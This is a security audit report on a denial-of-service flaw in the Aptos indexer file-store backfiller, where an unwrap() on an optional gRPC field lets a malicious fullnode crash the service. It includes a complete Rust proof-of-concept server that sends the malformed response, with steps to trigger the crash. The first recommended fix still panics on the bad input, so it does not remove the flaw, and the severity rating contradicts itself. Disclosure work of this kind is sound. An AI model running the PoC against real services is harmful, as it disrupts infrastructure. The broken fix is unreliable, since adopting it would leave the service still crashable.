# Audit Report

## Title
Indexer Backfiller DoS via Malformed GRPC Response Handling

## Summary
The indexer-grpc-v2-file-store-backfiller crashes when receiving GRPC responses from a malicious fullnode that omit the required `response` field, causing a panic on an `unwrap()` call and completely halting backfill operations.

## Finding Description

The backfiller's `backfill()` function processes GRPC responses from a fullnode without validating that the `response` field is present before calling `unwrap()`. [1](#0-0) 

The `TransactionsFromNodeResponse` protobuf message defines `response` as a `oneof` field, making it optional: [2](#0-1) 

In the generated Rust code, this translates to an `Option` type: [3](#0-2) 

**Attack Scenario:**
1. Attacker runs a malicious fullnode that implements the `FullnodeData` GRPC service
2. Operator configures the backfiller to connect to this malicious fullnode (or attacker compromises a legitimate fullnode)
3. Malicious fullnode sends `TransactionsFromNodeResponse` messages with:
   - `chain_id` field set correctly (passes the assertion on line 176)
   - `response` field set to `None` (not `Status` or `Data`)
4. The backfiller panics on line 177 when attempting to `unwrap()` the `None` value
5. Backfill operations completely halt, requiring manual restart

This violates the principle that infrastructure services should handle untrusted external input robustly. The backfiller connects to an externally-configured fullnode address and should not assume the fullnode is benign.

## Impact Explanation

**Severity: Medium**

This qualifies as Medium severity under the Aptos bug bounty program's "API crashes" category (listed under High severity) or as infrastructure disruption requiring intervention:

- **Availability Impact**: The backfiller process crashes and stops functioning entirely, disrupting indexing services that depend on backfilled data
- **No Consensus Impact**: This affects indexer infrastructure only, not the core blockchain consensus or validator operations
- **No Fund Loss**: No user funds are at risk
- **Recovery Required**: Manual intervention is required to restart the backfiller after each malicious response

While the indexer backfiller is ecosystem infrastructure rather than a consensus-critical component, its failure can disrupt downstream services that rely on complete historical transaction data. The attack requires minimal resources (running a malicious GRPC server) and can be repeated indefinitely.

## Likelihood Explanation

**Likelihood: Medium to High**

- **Attack Complexity**: Low - crafting a protobuf message with an empty `response` field is trivial
- **Attacker Requirements**: Minimal - only needs to run a malicious GRPC server and have the backfiller connect to it
- **Detection**: The attacker needs either:
  - Social engineering to get operators to use their malicious fullnode address, OR
  - Compromise of a legitimate fullnode that backfillers connect to
- **Repeatability**: Unlimited - the attack can be repeated on every restart

The primary barrier is getting the backfiller to connect to the malicious endpoint, but this could occur through misconfiguration, social engineering, or fullnode compromise.

## Recommendation

Replace the `unwrap()` call with proper error handling using pattern matching or `ok_or_else()`:

```rust
match response_item {
    Ok(r) => {
        assert!(r.chain_id == chain_id);
        match r.response {
            Some(Response::Data(data)) => {
                let transactions = data.transactions;
                for transaction in transactions {
                    file_store_operator
                        .buffer_and_maybe_dump_transactions_to_file(
                            transaction,
                            tx.clone(),
                        )
                        .await
                        .unwrap();
                }
            },
            Some(Response::Status(_)) => {
                continue;
            },
            None => {
                panic!("Received GRPC response without response field from fullnode. This indicates a malicious or malformed fullnode.");
            },
        }
    },
    Err(e) => {
        panic!("Error when getting transactions from fullnode: {e}.")
    },
}
```

Alternatively, log an error and gracefully terminate:

```rust
let response = r.response.ok_or_else(|| {
    anyhow::anyhow!("Received malformed GRPC response without response field")
})?;
match response {
    Response::Data(data) => { /* ... */ },
    Response::Status(_) => { continue; },
}
```

## Proof of Concept

```rust
// Proof of Concept: Malicious fullnode that sends responses without the response field
// This can be compiled and run as a standalone Rust binary

use aptos_protos::internal::fullnode::v1::{
    fullnode_data_server::{FullnodeData, FullnodeDataServer},
    GetTransactionsFromNodeRequest, TransactionsFromNodeResponse,
};
use tonic::{transport::Server, Request, Response, Status};
use futures::Stream;
use std::pin::Pin;

pub struct MaliciousFullnodeService;

#[tonic::async_trait]
impl FullnodeData for MaliciousFullnodeService {
    type GetTransactionsFromNodeStream = 
        Pin<Box<dyn Stream<Item = Result<TransactionsFromNodeResponse, Status>> + Send>>;

    async fn get_transactions_from_node(
        &self,
        _request: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        let (tx, rx) = tokio::sync::mpsc::channel(10);
        
        tokio::spawn(async move {
            // Send a malformed response with chain_id but no response field
            let malicious_response = TransactionsFromNodeResponse {
                chain_id: 1, // Correct chain ID to pass the assertion
                response: None, // Malicious: omit the response field
            };
            
            let _ = tx.send(Ok(malicious_response)).await;
        });
        
        let stream = tokio_stream::wrappers::ReceiverStream::new(rx);
        Ok(Response::new(Box::pin(stream)))
    }

    async fn ping(
        &self,
        _request: Request<aptos_protos::internal::fullnode::v1::PingFullnodeRequest>,
    ) -> Result<Response<aptos_protos::internal::fullnode::v1::PingFullnodeResponse>, Status> {
        Err(Status::unimplemented("Not implemented"))
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let addr = "[::1]:50051".parse()?;
    let service = MaliciousFullnodeService;

    println!("Malicious fullnode listening on {}", addr);
    println!("Configure backfiller to connect to this address to trigger the panic");

    Server::builder()
        .add_service(FullnodeDataServer::new(service))
        .serve(addr)
        .await?;

    Ok(())
}

// To demonstrate:
// 1. Run this malicious fullnode server
// 2. Configure the backfiller with: --fullnode-grpc-address http://[::1]:50051
// 3. The backfiller will panic on line 177 when it receives the malformed response
```

**Notes**

This vulnerability is specifically in the indexer backfiller infrastructure component, not in core consensus or validator operations. While it doesn't affect blockchain security directly, it represents a robustness issue where external untrusted input (from a configured fullnode) can crash the service. The fix is straightforward: replace `unwrap()` with proper error handling using `match` or `ok_or_else()` to gracefully handle malformed responses.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-v2-file-store-backfiller/src/processor.rs (L176-177)
```rust
                                    assert!(r.chain_id == chain_id);
                                    match r.response.unwrap() {
```

**File:** protos/proto/aptos/internal/fullnode/v1/fullnode_data.proto (L47-54)
```text
message TransactionsFromNodeResponse {
  oneof response {
    StreamStatus status = 1;
    TransactionsOutput data = 2;
  }
  // Making sure that all the responses include a chain id
  uint32 chain_id = 3;
}
```

**File:** protos/rust/src/pb/aptos.internal.fullnode.v1.rs (L79-84)
```rust
pub struct TransactionsFromNodeResponse {
    /// Making sure that all the responses include a chain id
    #[prost(uint32, tag="3")]
    pub chain_id: u32,
    #[prost(oneof="transactions_from_node_response::Response", tags="1, 2")]
    pub response: ::core::option::Option<transactions_from_node_response::Response>,
```
